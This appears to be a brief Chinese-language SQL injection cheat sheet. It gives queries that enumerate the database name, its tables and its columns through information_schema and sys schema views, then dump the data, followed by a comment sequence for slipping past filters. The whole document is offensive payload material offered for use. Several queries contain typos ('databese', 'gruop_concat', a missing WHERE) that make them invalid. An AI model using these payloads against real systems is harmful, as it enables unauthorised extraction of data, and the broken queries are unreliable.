
###### 一般爆破数据
```
select databese();

select group_concat(table_name) from information_schema.tables where table_schema=database()

select group_concat(column_name) from information_schema.columns where table_name='xxx'

select group_concat(columnxxx) from tablexxx;

select gruop_concat(table_name) from sys.schema_auto_increment_tables where table_schema=database()

select gruop_concat(column_name) from sys.schema_auto_increment_columns table_name='xxx'
```



使用特殊字符绕过：
```
/*00*/
```
